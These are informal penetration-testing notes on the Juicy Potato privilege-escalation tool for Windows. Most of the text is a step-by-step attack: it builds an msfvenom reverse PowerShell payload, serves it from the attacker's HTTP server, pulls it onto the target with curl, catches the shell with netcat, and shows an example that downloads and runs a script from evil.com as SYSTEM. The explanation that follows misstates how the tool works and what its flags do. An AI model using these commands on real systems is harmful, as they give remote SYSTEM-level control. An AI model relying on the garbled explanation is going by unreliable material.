https://github.com/ohpe/juicy-potato/releases/tag/v0.1

Download Juicy potato
create .bat file for reverse powershell

msfvenom -p cmd/windows/reverse_powershell lhost= $ip of attaker(Kali) lhost = 7777 -o evil.bat

in same folder where juicy potato and eveil.bat is stored run the python module for http
python3 -m http.server 8080

copy both file in target machine

curl http://$ip pf attacker:8080/juicypotato.exe  -o jp.exe
curl http://$ip of attacker:8080/evil.bat -o evil.bat

in attacker machine: nc -lnvp 7777

in target: ./jp.exe -t * -p evil.bat -l 4444





























Payload Execution:
        Once the COM object is loaded, it runs the attacker's payload with SYSTEM privileges.
        The payload might be a reverse shell, privilege escalation payload, or any code the attacker wants to execute.

Example Command:
______________________________________________________________________________________________________________________________________________________________________________
JuicyPotato.exe -p <PID> -t 111 -l 9999 -c "powershell.exe -Command 'Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://evil.com/malicious.ps1')'"
______________________________________________________________________________________________________________________________________________________________________________
In this example:

    -p <PID> specifies the target process to attack.
    -t 111 refers to the Event Log service.
    -l 9999 specifies the listening port for a reverse shell.
    -c is the command to execute once SYSTEM privileges are acquired (in this case, executing PowerShell commands to download and run a malicious script).

Impact and Benefits of Juicy Potato:

    Privilege Escalation: Once successfully executed, it allows an attacker to escalate their privileges from low-level user accounts to SYSTEM, allowing them to perform any action on the machine.
    Bypassing UAC: It works even if User Account Control (UAC) is enabled, since it doesn't require interactive user consent.
    Evading Detection: The exploit often evades traditional security software because it leverages existing Windows functionality (Event Log service and COM) and doesn't directly exploit a bug in the OS's core system, making it harder for antivirus and endpoint protection systems to detect.

Mitigations:

To defend against the Juicy Potato exploit, users and administrators can take several actions:

    Apply Patches: Always ensure that the latest security patches are installed. Microsoft frequently patches privilege escalation vulnerabilities.
    Restrict SeDebugPrivilege and SeImpersonatePrivilege: Ensure that SeDebugPrivilege and SeImpersonatePrivilege are not granted to untrusted users or low-privileged accounts.
    Monitor Event Logs: Watch for suspicious or unauthorized modifications to the Event Log service.
    Use Endpoint Protection Software: Deploy advanced endpoint protection tools that monitor and block malicious activity related to COM object hijacking or privilege escalation.

Conclusion:

The Juicy Potato exploit works by abusing Windows' Event Log service and COM object handling to escalate privileges from low-level users to SYSTEM level. It is highly effective on Windows 10 and Windows Server 2016/2019 and works by tricking Windows into executing malicious code with elevated privileges, leveraging the SeDebugPrivilege and SeImpersonatePrivilege. While it is an effective exploit, mitigation involves patching, privilege restrictions, and robust monitoring.
